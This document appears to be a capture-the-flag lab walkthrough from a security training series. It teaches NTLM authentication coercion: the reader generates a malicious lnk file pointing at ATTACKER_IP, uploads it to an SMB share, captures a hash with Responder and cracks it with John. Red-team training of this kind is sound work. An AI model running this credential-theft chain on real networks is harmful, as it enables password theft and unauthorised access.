McSkidy is unable to authenticate to her server! It seems that McGreedy has struck again and changed the password! We know it’s him since Log McBlue confirmed in the logs that there were authentication attempts from his laptop. Online brute-force attacks don’t seem to be working, so it’s time to get creative. We know that the server has a network file share, so if we can trick McGreedy, perhaps we can get him to disclose the new password to us. Let’s get to work!

Learning Objectives

- The basics of network file shares
- Understanding NTLM authentication
- How NTLM authentication coercion attacks work
- How Responder works for authentication coercion attacks
- Forcing authentication coercion using lnk files

Introduction

In today’s task, we will look at NTLM authentication and how threat actors can perform authentication coercion attacks. By coercing authentication, attackers can uncover sensitive information that can be used to gain access to pretty critical stuff. Let’s dive in!

Sharing Is Caring

We tend to think of computers as isolated devices. This may be true to an extent, but the real power of computing comes into play when we connect to networks. This is where we can start to share resources in order to achieve some pretty awesome things. In corporate environments, networks and network-based resources are used frequently. For example, in a network there’s no need for every user to have their own printer. Instead, the organisation can buy a couple of large printers that all employees can share. This not only saves costs but allows administrators to manage these systems more easily and centrally.

Another example of this is file shares. Instead of each employee having local copies of files and needing to perform crazy version control when sharing files with other employees via old-school methods like flash drives, the organisation can deploy a network file share. Since the files are stored in a central location, it’s easy to access them and ensure everyone has the latest version to hand. Administrators can also add security to file shares to ensure that only authenticated users can access them. Additionally, access controls can be applied to ensure employees can only access specific folders and files based on their job role.

However, it’s these same file shares that can land an organisation in hot water with red teamers. Usually, any employee has the ability to create a new network file share. Security controls are not often applied to these shares, allowing any authenticated user to access their contents. This can cause two issues:

- If a threat actor gains read access, they can look to exfiltrate sensitive information. In file shares of large organisations, you can often find interesting things just lying around, such as credentials or sensitive customer documents.
- If the threat actor gains write access, they could alter information stored in the share, potentially overwriting critical files or staging other attacks (as we’ll see in this task).
Before we can perform any of these types of attacks, we first need to understand how authentication works for network file shares.

NTLM Authentication

In the Day 11 task, we learned about Active Directory (AD) and Kerberos authentication. File shares are often used on servers and workstations connected to an AD domain. This allows AD to take care of access management for the file share. Once connected, it’s not only local users on the host who will have access to the file share; all AD users with permissions will have access, too. Similar to what we saw on Day 11, Kerberos authentication can be used to access these file shares. However, we’ll be focusing on the other popular authentication protocol: NetNTLM or NTLM authentication.

Before we dive into NTLM authentication, we should first talk about the Server Message Block protocol. The SMB protocol allows clients (like workstations) to communicate with a server (like a file share). In networks that use Microsoft AD, SMB governs everything from inter-network file-sharing to remote administration. Even the “out of paper” alert your computer receives when you try to print a document is the work of the SMB protocol. However, the security of earlier versions of the SMB protocol was deemed insufficient. Several vulnerabilities and exploits were discovered that could be leveraged to recover credentials or even gain code execution on devices. Although some of these vulnerabilities were resolved in newer versions of the protocol, legacy systems don’t support them, so organisations rarely enforce their use.

NetNTLM, often referred to as Windows Authentication or just NTLM Authentication, allows the application to play the role of a middleman between the client and AD. NetNTLM is a very popular authentication protocol in Windows and is used for various different services, including SMB and RDP. It is used in AD environments as it allows servers (such as network file shares) to pass the buck to AD for authentication. Let’s take a look at how it works in the animation below:

![dd](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/2da5b55b-66ed-4ad1-bc00-2ce8fba17056)

When a user wants to authenticate to a server, the server responds with a challenge. The user can then encrypt the challenge using their password (not their actual password, but the hash derived from the password) to create a response that is sent back to the server. The server then passes both the challenge and response to the domain controller. Since it knows the user’s password hash, it can verify the response. If the response is correct, the domain controller can notify the server that the user has been successfully authenticated and that the server can provide access. This prevents the application or server from having to store the user’s credentials, which are now securely and exclusively stored on the domain controller. Here’s the trick: if we could intercept these authentication requests and challenges, we could leverage them to gain unauthorised access. Let’s dive in a bit deeper.

Responding to the Race

There are usually lots of authentication requests and challenges flying around on the network. A popular tool that can be used to intercept them is Responder. Responder allows us to perform man-in-the-middle attacks by poisoning the responses during NetNTLM authentication, tricking the client into talking to you instead of the actual server they want to connect to.

On a real LAN, Responder will attempt to poison any Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected. On large Windows networks, these protocols allow hosts to perform their own local DNS resolution for all hosts on the same local network. Rather than overburdening network resources such as the DNS servers, first, hosts can attempt to determine if the host they are looking for is on the same local network by sending out LLMNR requests and seeing if any hosts respond. The NBT-NS is the precursor protocol to LLMNR, and WPAD requests are made to try to find a proxy for future HTTP(s) connections.

Since these protocols rely on requests broadcasted on the local network, our rogue device running Responder would receive them too. They would usually just be dropped since they were not meant for our host. However, Responder will actively listen to the requests and send poisoned responses telling the requesting host that our IP is associated with the requested hostname. By poisoning these requests, Responder attempts to force the client to connect to our AttackBox. In the same line, it starts to host several servers such as SMB, HTTP, SQL, and others to capture these requests and force authentication.

If you want to dive a bit deeper into using Responder for these poisoning attacks, have a look at the Breaching Active Directory room.

This was an incredibly popular red teaming technique to perform when it was possible to gain access to an office belonging to the target corporation. Simply plugging in a rogue network device and listening with Responder for a couple of hours would often yield several challenges that could then be cracked offline or relayed. Then, the pandemic hit and all of a sudden, being in the office was no longer cool. Most employees connected from home using a VPN. While this was great for remote working, it meant intercepting NetNTLM challenges was no longer really viable. Users connecting via VPN (which, in most cases, isn’t considered part of the local network) made it borderline impossible to intercept and poison LLMNR requests in a timely manner using Responder.

Now, we have to get a lot more creative. Cue a little something called coercion!

Unconventional Coercion

If we can’t just listen to and poison requests, we just have to create our own! This brings a new attack vector into the spotlight: coercion. Instead of waiting for requests, we coerce a system or service to authenticate us, allowing us to receive the challenge. Once we get this challenge, based on certain conditions, we can aim to perform two main attacks:

If the password of the account coerced to authenticate is weak, we could crack the corresponding NetNTLM challenge offline using tools such as Hashcat or John the Ripper.
If the server or service’s security configuration is insufficient, we could attempt to relay the challenge in order to impersonate the authenticating account.
Two incredibly popular versions of coerced authentication are PrintSpooler and PetitPotam.

PrintSpooler is an attack that coerces the Print Spooler service on Windows hosts to authenticate to a host of your choosing. PetitPotam is similar but leverages a different issue to coerce authentication. In these cases, it’s the machine account (the actual server or computer) that performs the authentication. Normally, machine account passwords are random and change every 30 days, so there isn’t really a good way for us to crack the challenge. However, often, we can relay this authentication attempt. By coercing a very privileged server, such as a domain controller, and then relaying the authentication attempt, an attacker could compromise not just a single server but all of AD!

If you are interested in learning more about these coercion attacks, have a look at the Exploiting Active Directory room.

Coercing the Connectee

For this task, we will focus a bit more on coercing users into authenticating to us. Since users often have weak passwords, with this approach, we have a much higher chance of cracking one of the challenges and gaining access as the user. Users are now mostly connecting to file shares via VPN, so we can’t simply run Responder and hope for the best. So, the question remains: how can we coerce users to authenticate to something we control? Let’s put it all together.

If we have write access to a network file share (that is used regularly), we can create a sneaky little file to coerce those users to authenticate to our server. We can do this by creating a file that, when viewed within the file browser, will coerce authentication automatically. There are many different file types that can be used for this, but they all work similarly: coercing authentication by requesting that an element, such as the file icon, is loaded from a remote location. We will be using the ntlm_theft tool to create these documents. If you are not using the AttackBox, you will have to download the tooling first. On the AttackBox, we can find the tooling by running the following in the terminal:

```
cd /root/Rooms/AoC2023/Day23/ntlm_theft/
```

For our specific example, we will create an lnk file using the following command:

```
python3 ntlm_theft.py -g lnk -s ATTACKER_IP -f stealthy
```

This will create an lnk file in the stealthy directory named stealthy.lnk. With this file, we can now coerce authentication!

McGreedy Much?

We know that McGreedy is a little snoopy. So let’s add the lnk file to our network share and hope he walks right into our trap. Use your favourite file editor, you can inspect the lnk file that we have created. We will now add this file to the network file share to coerce authentication. Connect to the network file share on \\10.10.226.5\ElfShare\. You can use smbclient to connect as shown below:

```
cd stealthy
smbclient //10.10.226.5/ElfShare/ -U guest%
smb: \>put stealthy.lnk
smb: \>dir
```

The first command will connect you to the share as a guest. The second command will upload your file, and the third command will list all files for verification.  Next, we need to run Responder to listen for incoming authentication attempts. We can do this by running the following command from a terminal window:

```responder -I ens5```

If you’re not using the AttackBox, you will have to replace ens5 with your tun adapter for your VPN connection.

Let’s give McGreedy a couple of minutes. He might be taking a hot chocolate break right now, but we should hear back from him in less than five minutes. While we wait, use your connection to the network file share to download the key list he left us as a clue using get greedykeys.txt. Once he authenticates, you will see the following in Responder:

```
[SMB] NTLMv2-SSP Client   : ::ffff:10.10.158.81
[SMB] NTLMv2-SSP Username : ELFHQSERVER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::ELFHQSERVER:a9ba71e9537c4fbb:5AC8FC35C8EE8159C95C118EB107DA84:redacted
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
```

Perfect! Now that we have the challenge, let’s try to crack it to recover the new password. As mentioned before, the challenge was encrypted with the user’s NTLM hash. This NTLM hash is derived from the user’s password. Therefore, we can now perform a brute-force attack on this challenge in order to recover the user’s password. Copy the contents of the NTLMv2-SSP Hash portion to a text file called hash.txt using your favourite editor and save it. Then, use the following command to run John to crack the challenge:

```john --wordlist=greedykeys.txt hash.txt```

After a few seconds, you should receive the password. Magic! We have access again! Take back control by using the username and password to authenticate to the host via RDP!

Conclusion

Coercing authentication with files is an incredible technique to have in your red team arsenal. Since conventional Responder intercepts are no longer working, this is a great way to continue intercepting authentication challenges. Plus, it goes even further. Using Responder to poison requests such as LLMNR typically disrupts the normal use of network services, causing users to receive Access Denied messages. Using lnk files for coercing authentication means that we are not actually poisoning legitimate network services but creating brand new ones. This lowers the chance of our actions being detected.

**Q/A**

